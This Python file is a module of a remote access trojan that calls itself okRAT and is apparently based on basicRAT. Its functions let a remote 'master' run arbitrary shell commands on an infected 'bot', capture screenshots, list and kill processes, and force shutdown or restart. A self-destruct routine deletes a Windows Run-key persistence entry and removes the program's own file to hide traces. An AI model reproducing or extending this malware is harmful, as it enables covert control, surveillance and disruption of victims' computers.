#
# okRAT toolkit module
#

import os
import subprocess
import sys
import pickle
import pyscreenshot as ImageGrab
from io import BytesIO


def execute(command):
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def screenshot():
    """Takes a screenshot of bot's monitors and sends it to the master.\n"""
    buffer = BytesIO()
    try:
        im = ImageGrab.grab()
        im.save(buffer, format='PNG')
        imp = pickle.dumps(buffer.getvalue(), 0)
        return imp
    except Exception as exception:
        return ('reachedexcept ' + str(exception))


def listprocesses():
    """List running processes."""
    return execute('tasklist')


def killprocess(process_name):
    """Kill running processes."""
    return execute('TASKKILL /IM ' + process_name + ' /F /T')


def shutdown(restart):
    '''Shutdown Computer'''
    if(restart):
        return execute("shutdown -t 0 -r -f")
    else:
        return execute("shutdown -t 0 -f")


def pwd():
    return os.getcwd()


def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass

    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

    # self delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)
